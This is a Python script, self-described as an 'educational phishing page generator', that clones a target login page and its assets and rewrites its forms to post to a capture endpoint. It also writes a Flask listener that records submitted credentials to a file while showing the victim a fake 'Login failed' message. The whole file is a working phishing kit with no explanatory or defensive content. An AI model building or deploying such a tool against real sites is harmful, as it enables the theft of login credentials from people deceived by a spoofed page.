import requests
from bs4 import BeautifulSoup
import os
import urllib.parse

TARGET_ACTION = "http://localhost:5000/capture"

def clone_and_modify(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    base_url = "{0.scheme}://{0.netloc}".format(urllib.parse.urlparse(url))

    output_dir = "output"
    assets_dir = os.path.join(output_dir, "assets")
    os.makedirs(assets_dir, exist_ok=True)

    def download_asset(tag, attr):
        src = tag.get(attr)
        if not src or src.startswith("data:") or src.startswith("javascript:"):
            return
        full_url = src if src.startswith("http") else urllib.parse.urljoin(base_url, src)
        filename = os.path.basename(urllib.parse.urlparse(full_url).path)
        local_path = os.path.join("assets", filename)
        try:
            asset = requests.get(full_url, timeout=5)
            with open(os.path.join(output_dir, local_path), "wb") as f:
                f.write(asset.content)
            tag[attr] = local_path
        except Exception as e:
            print(f"[!] Failed to download {full_url}: {e}")

    # Replace form action
    for form in soup.find_all("form"):
        form['action'] = TARGET_ACTION
        form['method'] = 'POST'

    # Download assets
    for tag in soup.find_all(["link", "script", "img"]):
        if tag.name == "link" and tag.get("rel") == ["stylesheet"]:
            download_asset(tag, "href")
        elif tag.name in ["script", "img"]:
            download_asset(tag, "src")

    # Save modified HTML
    with open(f"{output_dir}/index.html", "w", encoding='utf-8') as file:
        file.write(soup.prettify())

    # Save listener
    with open(f"{output_dir}/server.py", "w") as file:
        file.write(LISTENER_SCRIPT)

    print(f"[+] Page cloned with assets. Open output/index.html to test locally.")

LISTENER_SCRIPT = '''
from flask import Flask, request

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.form.to_dict()
    print("[+] Credentials Captured:", data)
    
    # Optional: Log captured credentials to a file
    with open('captured_credentials.txt', 'a') as f:
        f.write(str(data) + '\\n')
    
    return "<h1>Login failed. Try again later.</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
'''

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="PhishGen - Educational Phishing Page Generator")
    parser.add_argument("--url", required=True, help="Target login page URL to clone")
    args = parser.parse_args()

    clone_and_modify(args.url)
